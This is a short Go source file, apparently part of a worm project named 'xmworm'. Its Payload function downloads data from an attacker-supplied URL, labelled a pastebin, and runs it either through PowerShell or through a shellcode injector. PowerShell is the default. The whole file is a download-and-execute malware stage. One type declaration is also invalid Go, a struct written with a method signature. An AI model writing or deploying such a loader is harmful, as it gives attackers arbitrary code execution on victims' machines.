package payload

import (
	"io"
	"net/http"
	"fmt"
	sh "github.com/0/xmworm/shell"
	injector "github.com/0/xmworm/injector"
	"log"
)

type PayloadFetcher interface {
	fetch() ([]byte)
}

type HTTPPayloadFetcher struct {
	url string
}

func (fetcher HTTPPayloadFetcher) fetch() ([]byte) {
	resp, err := http.Get(fetcher.url)
	if err != nil {
		// handle error
		fmt.Println("Could not get")
		return []byte{}
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return []byte{}
	}

	fmt.Printf("%v\n", body)

	return body
}

func getPayload(fetcher PayloadFetcher) (payload []byte) {
	payload = fetcher.fetch()
	return
}

type PayloadExecutor struct {
	execute([]byte)
}
type PowershellPayloadExecutor struct {
}

func (pshexec PowershellPayloadExecutor) execute(payload []byte) {
	err := sh.Run(string(payload), "powershell")
	if err != nil {
		log.Printf("Failed to execute payload. ..continue")
	}
}

type ShellcodePayloadExecutor struct {
}

func (shcexec ShellcodePayloadExecutor) execute(payload []byte) {
	// do something.
	injector.Run(payload, "shellcode")
}

func Payload(payloadUrl string, payloadType string) {
	fmt.Printf("fetching payload from : %v\n", payloadUrl)
	httpfetcher := HTTPPayloadFetcher{url: payloadUrl}
	fmt.Printf("pastebin: %v\n", httpfetcher)
	payload := getPayload(httpfetcher)
	fmt.Printf("Executing payload...\n")

	switch payloadType{
	case "shellcode":
		executor := ShellcodePayloadExecutor{}
		executor.execute(payload)
	case "powershell":
		executor := PowershellPayloadExecutor{}
		executor.execute(payload)
	default:
		// default is powershell
		executor := PowershellPayloadExecutor{}
		executor.execute(payload)
	}
}